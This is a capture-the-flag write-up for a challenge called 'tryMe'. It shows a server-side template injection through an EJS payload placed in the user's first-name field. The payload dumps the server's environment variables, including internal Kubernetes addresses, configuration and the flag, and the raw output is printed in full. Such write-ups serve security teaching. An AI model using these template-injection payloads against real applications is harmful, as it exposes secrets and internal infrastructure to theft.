# tryMe
15 Points

## Solution

We get a page with a button "Send a test email". The developer console outputs a message: "Loading the code for the tryMe (15 pt) page. To debug this code, open o2txy.js in Developer Tools.".

Let's click the button. We get an email to the address we used for registration:

```
Hey firstName, Thanks for participating in the CTF!
Maybe there are some hints in the client-side code? (o2txy.js)
```

Ok then, let's check the code:

```javascript
import wixUsers from 'wix-users';
import wixLocation from 'wix-location';
import {sendMail,checkFlag} from 'backend/motiSendMail';


$w.onReady(function () {
	let user = wixUsers.currentUser;
	let isLoggedIn = user.loggedIn;
	if (!isLoggedIn)
		wixLocation.to("/")
});


export function button1_click(event) {
		/* TODO (ctf) - Security folks asked us to add XSS filtering on the username on the backend, 
		https://stackoverflow.com/questions/31787351/can-we-do-something-like-alerttemp-in-ejs 
		
		Perhaps we need to define this behaviour in the environment variables?
		*/
		sendMail().then(function(result) {
			$w('#text7').text = result.toString();
			$w('#text7').show();
});
}


```

Looks like they are concerned about XSS filtering in the backend, and link to a StackOverflow question for which the answer to is:

```
<%= TEMP  %>
```

So let's try to use the same technique by changing our first name, for example to `<%- JSON.stringify(locals) %>`. After clicking the button again, we get the following email:

```
Hey {"html":"Hey <%- JSON.stringify(locals) %> ,Thanks for participating in the CTF!\nMaybe there are some hints in the client-side code? (o2txy.js)"} ,Thanks for participating in the CTF!
Maybe there are some hints in the client-side code? (o2txy.js)
```

Looks like it's working. Now we change the name to: `<%- JSON.stringify(process.env) %>` and get:

```
Hey {"PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME":"kore-ghost-pub-ga-5d955446b-74sch","NODE_ENV":"production","NODE_CONFIG":"{\"elementory\" : {\"edmRoot\": \"/dynamic-modules/edm_root\", \"npmPath\": \"/dynamic-modules/third-party-npm\", \"edmRootNode14\": \"/dynamic-modules/edm_root-14\", \"npmPathNode14\": \"/dynamic-modules/third-party-npm-14\" ,\"webMethodTimeoutMillis\": 14000, \"xSeenBy\":\"3h6zdoeTDYlwgjQoBu5YkQ==\", \"useGenericError\": true, \"viewMode\": \"Public\" }, \"bundler\": {\"disable\": false},\"dataApi\": {\"serviceHost\": \"docstore.wix-code.com\",\"servicePort\": 80,\"baseUrl\": \"/api/apps\"},\"disUrl\":\"http://dis.wix-code.com\",\"monitoringHub\": {\"host\": \"monitoringhub.wix.com\",\"port\": 80,\"baseUrl\": \"\",\"dc\": \"84\",\"source\": \"elementory\"}}","POD_NAME":"kore-ghost-pub-ga-5d955446b-74sch","TRACE_ORIGIN":"kore-ghost-pub-ga-5d955446b-74sch","POD_IP":"10.243.2.88","PORT":"3000","KORE_NETWORK_COMPASS_PORT":"tcp://10.243.68.61:80","KORE_NETWORK_COMPASS_PORT_80_TCP":"tcp://10.243.68.61:80","KUBERNETES_SERVICE_PORT":"443","BUNDLER_PUB_GA_SERVICE_PORT_HTTP":"80","BUNDLER_PUB_GA_PORT":"tcp://10.243.68.146:80","KORE_NETWORK_COMPASS_SERVICE_HOST":"10.243.68.61","KORE_NETWORK_COMPASS_PORT_80_TCP_PROTO":"tcp","KORE_NETWORK_COMPASS_PORT_80_TCP_PORT":"80","KUBERNETES_PORT_443_TCP_PORT":"443","KUBERNETES_PORT_443_TCP_ADDR":"10.243.64.1","BUNDLER_PUB_GA_SERVICE_PORT":"80","BUNDLER_PUB_GA_PORT_80_TCP_PROTO":"tcp","BUNDLER_PUB_GA_PORT_80_TCP_ADDR":"10.243.68.146","KORE_NETWORK_COMPASS_SERVICE_PORT":"80","KORE_NETWORK_COMPASS_PORT_80_TCP_ADDR":"10.243.68.61","KUBERNETES_SERVICE_PORT_HTTPS":"443","KUBERNETES_PORT":"tcp://10.243.64.1:443","KUBERNETES_PORT_443_TCP":"tcp://10.243.64.1:443","BUNDLER_PUB_GA_PORT_80_TCP":"tcp://10.243.68.146:80","BUNDLER_PUB_GA_PORT_80_TCP_PORT":"80","KUBERNETES_SERVICE_HOST":"10.243.64.1","KUBERNETES_PORT_443_TCP_PROTO":"tcp","BUNDLER_PUB_GA_SERVICE_HOST":"10.243.68.146","DEBUG":"wix:error:*","HOME":"/","CHALLENGE_3_FLAG":"flag{SSTI_IS_NOT_A_JOKE!@#@$%!@}"} ,Thanks for participating in the CTF!
```

The flag: `flag{SSTI_IS_NOT_A_JOKE!@#@$%!@}"}`